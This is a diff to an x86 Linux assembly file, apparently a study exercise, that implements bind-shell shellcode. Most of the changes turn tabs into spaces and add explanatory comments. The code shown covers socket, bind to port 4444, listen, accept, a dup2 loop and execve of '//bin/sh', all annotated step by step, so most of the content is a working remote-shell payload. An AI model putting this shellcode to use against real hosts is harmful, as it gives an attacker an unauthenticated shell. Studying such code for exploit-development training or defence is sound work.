@@ -54,7 +54,7 @@ _start:
 ; push params to the stack last first
 
 xor eax, eax     ; zeroing out edx to set IPPROTO_IP to 0
-push eax     	 ; pushing IPPROTO_IP onto stack
+push eax         ; pushing IPPROTO_IP onto stack
 push byte 0x01   ; pushing SOCK_STREAM onto stack
 push byte 0x02   ; pushing AF_INET onto stack
 
@@ -63,7 +63,7 @@ mov ecx, esp     ; moving address of parameter structure into ecx
 xor eax, eax     ; zeroing out eax
 mov al, 0x66     ; moving socketcall value into eax
 
-xor ebx, ebx	 ; zeroing out ebx
+xor ebx, ebx     ; zeroing out ebx
 mov bl, 0x01     ; moving SYS_SOCKET into ebx
 
 int 0x80         ; calling interupt which triggers socketcall
@@ -141,7 +141,7 @@ xchg eax, esi    ; esi now contains our socketid
 ; we need to create the first stack pointer for sockaddr_in
 
 xor edx, edx
-push edx     	    ; moving 0.0.0.0 into address
+push edx            ; moving 0.0.0.0 into address
 push word  0x5C11   ; port number (least significant byte first ... 0x115C is 4444)
 push word  0x02     ; AF_INET - which is 0x02
 
@@ -159,7 +159,7 @@ mov ecx, esp        ; moving stack pointer to ecx
 ; lets increment it by one
 inc ebx             ; increasing ebx from 1 to 2
 
-xor eax, eax	    ; zeroing out eax
+xor eax, eax        ; zeroing out eax
 mov al, 0x66        ; moving socketcall value into eax
 
 int 0x80            ; calling interupt which triggers socketcall
@@ -196,10 +196,10 @@ push esi            ; moving socketid to stack
 
 mov ecx, esp        ; moving stack pointer to ecx
 
-xor ebx, ebx	    ; zeroing out ebx
+xor ebx, ebx        ; zeroing out ebx
 mov bl, 0x04        ; setting ebx to 0x04
 
-xor eax, eax	    ; zeroing out eax
+xor eax, eax        ; zeroing out eax
 mov al, 0x66        ; moving socketcall value into eax
                     ; register value: 0x00000066h
 
@@ -262,14 +262,15 @@ mov al, 0x66     ; moving socketcall value into eax
 int 0x80         ; calling interupt which triggers socketcall
 
 ; registers after calling socktcall
-
+;
 ; /----eax----\   /---ebx---\   /--------ecx---------\   /---esi---\
 ; |  clientid  |  |   0x05  |   |  *address to params |  | socketid |
 ; \------------/  \---------/   \---------------------/  \---------/
 
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-; ASM version:  int dup2(clientid, localDiscripToDuplicate);
+; C version  :  int dup2(clientid, localDiscripToDuplicate);
+; ASM version:  standard syscall using same format as above
 ; ----- 
 ; Param Values: 
 ;   clientid                        /* currently stored in eax */
@@ -289,7 +290,7 @@ mov ebx, eax        ; moving clientid from eax to ebx
                     ; now we need a loop to run through for
                     ; 0, 1 and 2
 
-xor ecx, ecx	    ; zeroing out ecx
+xor ecx, ecx        ; zeroing out ecx
 mov cl, 0x03        ; moving syscall for dup2
 
 dupin:
@@ -300,67 +301,87 @@ dupin:
     int 0x80            ; syscall triggering listen
     jnz dupin           ; if the zero flag is not set then do it again
 
+; registers after calling socktcall
+; 
+; since we don't care about any return values
+; we don't bother tracking register values
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; C version  :  int execve(const char *filename, char *const argv[], char *const envp[]);
+; ASM version:  standard syscall using same format as above
+; ----- 
+; Param Values: 
+;   filename     /* path of elf32 to execute */
+;
+;   argv         /* standard argv, first param is full path to elf32 null terminated */
+;
+;   envp        /* any environmental specific things, null in our case */
+; -----
+; Registers before calling execve: 
+;
+; /---eax---\   /----------------ebx--------------------\   /-------------ecx---------------\
+; |   0x0B  |   | stack address if //bin/sh,0x00000000  |   |  stack address to 0x00000000  |
+; \---------/   \---------------------------------------/   \-------------------------------/
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-shellin:
-	; call execve in order to complete the local bind shell
-	; execve("/bin/sh", argv[], envp[]);
-	; argv needs to be Address of /bin/sh, 0x00000000
-	; this is because when you call something from bash, etc
-	; argv will contain the path of the executable within it
+; call execve in order to complete the local bind shell
+; execve("/bin/sh", argv[], envp[]);
+; argv needs to be Address of /bin/sh, 0x00000000
+; this is because when you call something from bash, etc
+; argv will contain the path of the executable within it
 
-	; before starting we look like:
-	; execve(NOT-SET-YET, NOT-SET-YET, NOT-SET-YET)
+; before starting we look like:
+; execve(NOT-SET-YET, NOT-SET-YET, NOT-SET-YET)
 
-	; First we need to get 0x00000000 into ebx somehow
-	; so lets zero out eax and push it to esp
+; First we need to get 0x00000000 into ebx somehow
+; so lets zero out eax and push it to esp
 
-	xor eax, eax	; zeroing out eax to make it 0x00000000
-	push eax	; pushing 0x00000000 onto the stack (esp)
-	
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	; esp now looks like: 0x00000000;
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+xor eax, eax    ; zeroing out eax to make it 0x00000000
+push eax        ; pushing 0x00000000 onto the stack (esp)
 
-	; pushing "//bin/sh" (8)
-	push 0x68732f6e ; hs/n : 2f68732f into esp
-	push 0x69622f2f ; ib// : 6e69622f into esp
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; esp now looks like: 0x00000000;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;esp now looks like: "//bin/sh,0x00000000";
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; pushing "//bin/sh" (8 bytes and reverses due to little endian)
+push 0x68732f6e ; hs/n : 2f68732f into esp
+push 0x69622f2f ; ib// : 6e69622f into esp
 
-	; since we have been pushing to the stack, we have been pushing to esp
-	; now we need to get "//bin/sh,0x00000000" into ebx since it is the first parameter for execve
-	; since esp contains exactly what we need we move it to ebx
-	
-	mov ebx, esp 	; moving the param to ebx
-			; ebx now contains "//bin/sh,0x00000000"
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;esp now looks like: "//bin/sh,0x00000000";
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	; now we look like: execve("//bin/sh,0x00000000", NOT-SET-YET, NOT-SET-YET);
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; since we have been pushing to the stack, we have been pushing to esp
+; now we need to get "//bin/sh,0x00000000" into ebx since it is the first parameter for execve
+; since esp contains exactly what we need we move it to ebx
 
-	; now we need to get 0x00000000 into edx
-	push eax	; eax is still 0x00000000 so push it to esp
-	mov  edx, esp	; we need to move a 0x00000000 into 
-			; the third parameter in edx
+mov ebx, esp    ; moving the param to ebx
+                ; ebx now contains "//bin/sh,0x00000000"
 
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	; now we look like: execve("//bin/sh,0x00000000", NOT-SET-YET, 0x00000000);
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; now we look like: execve("//bin/sh,0x00000000", NOT-SET-YET, NOT-SET-YET);
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-	; the second parameter is needs to be "//bin/sh,0x00000000"
-	; which we can accomplish by moving ebx onto the stack
-	; and then moving esp into ecx since it will be on the stack
+; now we need to get 0x00000000 into edx
+push eax        ; eax is still 0x00000000 so push it to esp
+mov  edx, esp   ; we need to move a 0x00000000 into 
+                ; the third parameter in edx
 
-	push ebx	; pushing "//bin/sh,0x00000000" back to the stack
-	mov  ecx, esp	; moving the address of ebx (on the stack) to ecx
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; now we look like: execve("//bin/sh,0x00000000", NOT-SET-YET, 0x00000000);
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-        ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-        ; now we look like: execve("//bin/sh,0x00000000", *"//bin/sh,0x00000000", 0x00000000);
-        ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	
-	; loading syscall execve
-	mov al, 0x0B	; 11 dec / 0x0b hex
-	int 0x80
+; the second parameter is needs to be "//bin/sh,0x00000000"
+; which we can accomplish by moving ebx onto the stack
+; and then moving esp into ecx since it will be on the stack
+
+push ebx        ; pushing "//bin/sh,0x00000000" back to the stack
+mov  ecx, esp   ; moving the address of ebx (on the stack) to ecx
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; now we look like: execve("//bin/sh,0x00000000", *"//bin/sh,0x00000000", 0x00000000);
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+; loading syscall execve
+mov al, 0x0B    ; syscall for execve is 11 dec / 0x0B hex
+int 0x80
